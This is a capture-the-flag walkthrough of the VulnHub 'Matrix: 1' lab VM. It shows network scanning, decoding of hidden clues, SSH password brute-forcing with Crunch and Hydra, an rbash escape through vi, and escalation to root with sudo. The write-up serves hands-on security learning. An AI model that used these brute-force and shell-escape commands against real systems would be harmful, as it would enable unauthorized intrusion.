# Matrix: 1

- **Machine:** Matrix: 1
- **Download:** https://www.vulnhub.com/entry/matrix-1,259/

![](836-1.png)

---

# Setup

1. Extract the downloaded archive.
2. Import the `.ova` file into VirtualBox.
3. Click **Finish**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](836-2.png)

---

## Full Nmap Scan

Run a full scan to enumerate open ports, services, operating system information, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.169
```

![](836-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.169
```

```bash
nmap -sC -sV -A 192.168.2.169
```

---

## HTTP Enumeration

Run the HTTP enumeration script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.169
```

![](836-4.png)

---

# Web Enumeration

Visit the web server.

- http://192.168.2.169/

---

## Directory Enumeration

Enumerate hidden directories.

```bash
gobuster dir -u http://192.168.2.169/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

![](836-5.png)

Discovered endpoint:

- http://192.168.2.169/assets/

---

## Enumerate Port 31337

Visit the service running on port **31337**.

- http://192.168.2.169:31337/

Inspect the page source.

```text
view-source:http://192.168.2.169:31337/
```

![](836-6.png)

An encoded Base64 string is discovered.

```text
ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=
```

---

## Decode the Base64 String

```bash
echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d
```

![](836-7.png)

The decoded output references another file.

Visit:

- http://192.168.2.169:31337/Cypher.matrix

The server downloads a file.

![](836-8.png)

The contents are encoded using **Brainfuck**.

Decode it using:

- https://www.dcode.fr/brainfuck-language

![](836-9.png)

Decoded message:

```text
You can enter into matrix as guest, with password k1ll0rXX
Note : Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
```

Discovered information:

```text
Username : guest
Password : k1ll0rXX
```

The last two password characters are missing.

---

# SSH Access

Since only the last two characters are unknown, generate a custom wordlist using **Crunch**.

```bash
crunch 8 8 -t k1ll0r%@ -o wordlist.txt
```

![](836-10.png)

Brute-force the SSH login.

```bash
hydra -l guest -P wordlist.txt ssh://192.168.2.169
```

![](836-11.png)

Recovered credentials:

```text
Username : guest
Password : k1ll0r7n
```

Login through SSH.

```bash
ssh guest@192.168.2.169
```

![](836-12.png)

Successfully obtained SSH access.

---

## Escaping the Restricted Shell

The system provides an **rbash** (restricted shell).

Escape it using **vi**.

```bash
vi -c ':!/bin/bash'
```

Update the PATH.

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Verify the current shell.

```bash
echo $0
```

![](836-13.png)

Set standard environment variables.

```bash
export PATH=/bin:/usr/bin:$PATH
```

```bash
export SHELL=/bin/bash
```

Verify.

```bash
echo $SHELL
```

![](836-14.png)

---

# Privilege Escalation

Enumerate sudo privileges.

```bash
sudo -l
```

![](836-15.png)

Switch to the root account.

```bash
sudo su
```

The system requests the user's password.

![](836-16.png)

After authentication, verify privileges.

```bash
id
```

![](836-17.png)

List the root directory.

```bash
ls
```

![](836-18.png)

Read the final flag.

```bash
cat flag.txt
```

![](836-19.png)

---

# Key Learning

- Enumerate all open ports, including non-standard services.
- Always inspect the HTML source for hidden clues.
- Decode multiple encoding formats (Base64, Brainfuck) during enumeration.
- Generate targeted wordlists using **Crunch**.
- Use Hydra for password brute-forcing when the search space is small.
- Escape restricted shells using **vi**.
- Always enumerate sudo privileges after obtaining shell access.

---

# Summary

The attack started with web enumeration, where a hidden service on port **31337** exposed multiple encoded clues. A Base64 string revealed a downloadable Brainfuck-encoded file, which contained a partially disclosed SSH password. A custom wordlist was generated with **Crunch**, allowing Hydra to recover the complete SSH credentials. After logging in, the restricted shell was escaped using **vi**, and sudo privileges were enumerated. The user was then able to switch to the root account and retrieve the final flag.